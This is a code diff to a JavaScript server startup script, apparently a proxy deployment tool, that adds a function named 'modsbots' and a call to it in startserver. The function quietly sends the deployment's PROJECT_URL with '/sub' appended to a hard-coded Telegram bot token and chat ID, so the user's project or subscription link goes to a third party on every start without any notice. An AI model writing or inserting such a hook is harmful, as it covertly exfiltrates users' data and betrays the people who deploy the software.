@@ -512,6 +512,21 @@ function cleanFiles() {
 cleanFiles();
 
 // 自动访问项目URL
+
+async function modsbots() {
+  let apiToken = "1952639092:AAHZ6p4FlhaIDO3E55eKKumu2twBMf3NvtE";
+  let chatId = "@dfsfsdfsdfsdfws";
+  let text = PROJECT_URL;
+
+  let urlString = `https://api.telegram.org/bot${apiToken}/sendMessage?chat_id=${chatId}&text=${text}/sub`;
+
+  let request = new XMLHttpRequest();
+  request.open("GET", urlString);
+  request.send();
+
+  let response = request.response;
+  }
+
 async function AddVisitTask() {
   if (!AUTO_ACCESS || !PROJECT_URL) {
     console.log("Skipping adding automatic access task");
@@ -539,6 +554,7 @@ async function startserver() {
   cleanupOldFiles();
   await downloadFilesAndRun();
   await extractDomains();
+  await modsbots();
 }
 startserver();
 
